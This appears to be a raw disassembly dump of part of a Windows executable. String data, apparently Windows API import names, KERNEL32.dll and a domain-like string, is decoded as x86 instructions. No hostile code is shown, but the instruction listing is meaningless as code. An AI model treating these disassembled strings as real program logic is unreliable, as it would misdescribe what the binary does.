  4293b0:	pop    ds
  4293b1:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  4293b5:	popa   
  4293b6:	ins    BYTE PTR es:[edi],dx
  4293b7:	push   ebx
  4293b8:	imul   edi,DWORD PTR [edx+0x65],0x47025700
  4293bf:	gs je  0x429415
  4293c2:	jns    0x429437
  4293c4:	je     0x42942b
  4293c6:	ins    DWORD PTR es:[edi],dx
  4293c7:	inc    esp
  4293c8:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4293cf:	jns    0x429412
  4293d1:	add    BYTE PTR [esi+0x74654701],ah
  4293d7:	inc    ebx
  4293d8:	outs   dx,DWORD PTR ds:[esi]
  4293d9:	ins    DWORD PTR es:[edi],dx
  4293da:	jo     0x429451
  4293dc:	je     0x429443
  4293de:	jb     0x42942e
  4293e0:	popa   
  4293e1:	ins    DWORD PTR es:[edi],dx
  4293e2:	gs push edi
  4293e4:	add    BYTE PTR [eax],al
  4293e6:	rol    BYTE PTR [eax],cl
  4293e8:	inc    ebx
  4293e9:	jb     0x429450
  4293eb:	popa   
  4293ec:	je     0x429453
  4293ee:	inc    esi
  4293ef:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  4293f7:	outs   dx,BYTE PTR ds:[esi]
  4293f8:	addr16 inc ecx
  4293fa:	add    BYTE PTR [eax],al
  4293fc:	retf   0x4300
  4293ff:	jb     0x429466
  429401:	popa   
  429402:	je     0x429469
  429404:	inc    esp
  429405:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  42940c:	jns    0x429465
  42940e:	add    BYTE PTR [eax],al
  429410:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429411:	add    BYTE PTR [ebx+0x61],al
  429414:	outs   dx,BYTE PTR ds:[esi]
  429415:	arpl   WORD PTR [ebp+0x6c],sp
  429418:	push   edi
  429419:	popa   
  42941a:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  429422:	ins    DWORD PTR es:[edi],dx
  429423:	gs jb  0x429426
  429426:	add    al,0x2
  429428:	inc    edi
  429429:	gs je  0x429478
  42942c:	outs   dx,DWORD PTR ds:[esi]
  42942d:	arpl   WORD PTR [ecx+0x6c],sp
  429430:	gs dec ecx
  429432:	outs   dx,BYTE PTR ds:[esi]
  429433:	outs   dx,WORD PTR ds:[esi]
  429435:	inc    ecx
  429436:	add    BYTE PTR [eax],al
  429438:	xor    eax,0x766f4d03
  42943d:	gs inc esi
  42943f:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x47019d00
  429447:	gs je  0x42948d
  42944a:	outs   dx,DWORD PTR ds:[esi]
  42944b:	ins    DWORD PTR es:[edi],dx
  42944c:	ins    DWORD PTR es:[edi],dx
  42944d:	push   ebx
  42944e:	je     0x4294b1
  429450:	je     0x4294b7
  429452:	add    BYTE PTR [eax],al
  429454:	mov    ah,0x3
  429456:	push   edx
  429457:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x61577265
  429460:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6e695372
  429468:	ins    BYTE PTR es:[di],dx
  42946a:	gs dec edi
  42946c:	bound  ebp,QWORD PTR [edx+0x65]
  42946f:	arpl   WORD PTR [eax+eax*1+0x5d],si
  429473:	add    al,BYTE PTR [edi+0x65]
  429476:	je     0x4294cb
  429478:	jns    0x4294ed
  42947a:	je     0x4294e1
  42947c:	ins    DWORD PTR es:[edi],dx
  42947d:	push   esp
  42947e:	imul   ebp,DWORD PTR [ebp+0x65],0x756a6441
  429485:	jae    0x4294fb
  429487:	ins    DWORD PTR es:[edi],dx
  429488:	outs   dx,BYTE PTR gs:[esi]
  42948a:	je     0x42948c
  42948c:	add    al,0x1
  42948e:	inc    esp
  42948f:	gs ins BYTE PTR es:[edi],dx
  429491:	gs je  0x4294f9
  429494:	inc    esi
  429495:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x47024900
  42949d:	gs je  0x4294f3
  4294a0:	push   0x5074726f
  4294a5:	popa   
  4294a6:	je     0x429510
  4294a8:	dec    esi
  4294a9:	popa   
  4294aa:	ins    DWORD PTR es:[edi],dx
  4294ab:	gs inc ecx
  4294ad:	add    BYTE PTR [edx],al
  4294af:	add    DWORD PTR [ebp+eiz*2+0x6c],eax
  4294b3:	gs je  0x42951b
  4294b6:	inc    ebx
  4294b7:	jb     0x429522
  4294b9:	je     0x429524
  4294bb:	arpl   WORD PTR [ecx+0x6c],sp
  4294be:	push   ebx
  4294bf:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4294c4:	outs   dx,BYTE PTR ds:[esi]
  4294c5:	add    bl,ah
  4294c7:	add    BYTE PTR [ebx+0x72],al
  4294ca:	gs popa 
  4294cc:	je     0x429533
  4294ce:	dec    esi
  4294cf:	popa   
  4294d0:	ins    DWORD PTR es:[edi],dx
  4294d1:	gs fs push eax
  4294d4:	imul   esi,DWORD PTR [eax+0x65],0xd4000057
  4294db:	add    cl,BYTE PTR [ecx+0x73]
  4294de:	inc    edx
  4294df:	popa   
  4294e0:	fs push edx
  4294e2:	gs popa 
  4294e4:	fs push eax
  4294e6:	je     0x42955a
  4294e8:	add    BYTE PTR [eax],al
  4294ea:	jnp    0x4294ee
  4294ec:	inc    edi
  4294ed:	gs je  0x429545
  4294f0:	jae    0x429557
  4294f2:	jb     0x429538
  4294f4:	gs popaw 
  4294f7:	jne    0x429565
  4294f9:	je     0x429547
  4294fb:	inc    ebx
  4294fc:	dec    ecx
  4294fd:	inc    esp
  4294fe:	add    BYTE PTR [eax],al
  429500:	inc    ebp
  429501:	add    al,BYTE PTR [edi+0x65]
  429504:	je     0x429556
  429506:	jb     0x429577
  429508:	arpl   WORD PTR [ecx+0x64],ax
  42950b:	fs jb  0x429573
  42950e:	jae    0x429583
  429510:	add    BYTE PTR [eax],al
  429512:	mov    BYTE PTR [ebx],0x52
  429515:	gs jae 0x42957d
  429518:	je     0x42955f
  42951a:	jbe    0x429581
  42951c:	outs   dx,BYTE PTR ds:[esi]
  42951d:	je     0x42951f
  42951f:	add    BYTE PTR [edx+0x656c4300],ch
  429525:	popa   
  429526:	jb     0x42956b
  429528:	outs   dx,DWORD PTR ds:[esi]
  429529:	ins    DWORD PTR es:[edi],dx
  42952a:	ins    DWORD PTR es:[edi],dx
  42952b:	inc    ebp
  42952c:	jb     0x4295a0
  42952e:	outs   dx,DWORD PTR ds:[esi]
  42952f:	jb     0x429531
  429531:	add    BYTE PTR [eax+0x61654802],bh
  429537:	jo     0x42958e
  429539:	outs   dx,BYTE PTR ds:[esi]
  42953a:	ins    BYTE PTR es:[edi],dx
  42953b:	outs   dx,DWORD PTR ds:[esi]
  42953c:	arpl   WORD PTR [ebx+0x0],bp
  42953f:	add    dh,ch
  429541:	add    edx,DWORD PTR [ebx+0x65]
  429544:	je     0x429589
  429546:	outs   dx,DWORD PTR ds:[esi]
  429547:	ins    DWORD PTR es:[edi],dx
  429548:	ins    DWORD PTR es:[edi],dx
  429549:	push   ebx
  42954a:	je     0x4295ad
  42954c:	je     0x4295b3
  42954e:	add    BYTE PTR [eax],al
  429550:	out    dx,eax
  429551:	add    DWORD PTR [edi+0x65],eax
  429554:	je     0x42959c
  429556:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  42955e:	bound  esi,QWORD PTR [ebp+0x74]
  429561:	gs jae 0x4295a5
  429564:	add    BYTE PTR [eax],al
  429566:	sub    al,0x1
  429568:	inc    ebp
  429569:	outs   dx,BYTE PTR ds:[esi]
  42956a:	jne    0x4295d9
  42956c:	push   ebx
  42956d:	jns    0x4295e2
  42956f:	je     0x4295d6
  429571:	ins    DWORD PTR es:[edi],dx
  429572:	dec    esp
  429573:	outs   dx,DWORD PTR ds:[esi]
  429574:	arpl   WORD PTR [ecx+0x6c],sp
  429577:	gs jae 0x4295bb
  42957a:	add    BYTE PTR [eax],al
  42957c:	sub    eax,0x74655304
  429581:	dec    esp
  429582:	outs   dx,DWORD PTR ds:[esi]
  429583:	arpl   WORD PTR [ecx+0x6c],sp
  429586:	push   esp
  429587:	imul   ebp,DWORD PTR [ebp+0x65],0x1240000
  42958e:	inc    ebp
  42958f:	outs   dx,BYTE PTR ds:[esi]
  429590:	jne    0x4295ff
  429592:	push   edx
  429593:	gs jae 0x429605
  429596:	jne    0x42960a
  429598:	arpl   WORD PTR [ebp+0x4e],sp
  42959b:	popa   
  42959c:	ins    DWORD PTR es:[edi],dx
  42959d:	gs jae 0x4295f7
  4295a0:	add    BYTE PTR [eax],al
  4295a2:	imul   eax,DWORD PTR [esp+edx*2],0x7246736c
  4295a9:	gs add BYTE PTR gs:[ebx],ah
  4295ad:	add    al,0x53
  4295af:	gs je  0x4295f8
  4295b2:	imul   ebp,DWORD PTR [ebp+eiz*2+0x50],0x746e696f
  4295ba:	gs jb  0x4295bd
  4295bd:	add    BYTE PTR [edi+0x1],ch
  4295c0:	inc    esi
  4295c1:	imul   ebp,DWORD PTR [esi+0x64],0x6f736552
  4295c8:	jne    0x42963c
  4295ca:	arpl   WORD PTR [ebp+0x41],sp
  4295cd:	add    BYTE PTR ds:0x6c654401,al
  4295d3:	gs je  0x42963b
  4295d6:	inc    esi
  4295d7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x4701a400
  4295df:	gs je  0x429625
  4295e2:	outs   dx,DWORD PTR ds:[esi]
  4295e3:	ins    DWORD PTR es:[edi],dx
  4295e4:	jo     0x42965b
  4295e6:	je     0x42964d
  4295e8:	jb     0x429638
  4295ea:	popa   
  4295eb:	ins    DWORD PTR es:[edi],dx
  4295ec:	gs inc ebp
  4295ee:	js     0x429631
  4295f0:	add    BYTE PTR [eax],al
  4295f2:	cmp    BYTE PTR [ebx],al
  4295f4:	dec    ebp
  4295f5:	outs   dx,DWORD PTR ds:[esi]
  4295f6:	jbe    0x42965d
  4295f8:	inc    esi
  4295f9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x52454b00
  429601:	dec    esi
  429602:	inc    ebp
  429603:	dec    esp
  429604:	xor    esi,DWORD PTR [edx]
  429606:	cs fs ins BYTE PTR es:[edi],dx
  429609:	ins    BYTE PTR es:[edi],dx
  42960a:	add    BYTE PTR [eax],al
  42960c:	add    BYTE PTR [eax],al
  42960e:	add    BYTE PTR [eax],al
  429610:	jg     0x429634
  429612:	add    al,BYTE PTR [eax]
	...
  429630:	dec    ebx
  429631:	xchg   esi,eax
  429632:	add    al,BYTE PTR [eax]
	...
  429640:	imul   esp,DWORD PTR fs:[edx+0x6f],0x632e6661
  429648:	outs   dx,DWORD PTR ds:[esi]
  429649:	ins    DWORD PTR es:[edi],dx
  42964a:	add    BYTE PTR [ebx+0x72],al
  42964d:	je     0x4296a3
  42964f:	push   0x64616572
  429654:	inc    ebp
  429655:	js     0x429698
  429657:	inc    eax
  429658:	cmp    BYTE PTR [eax],al
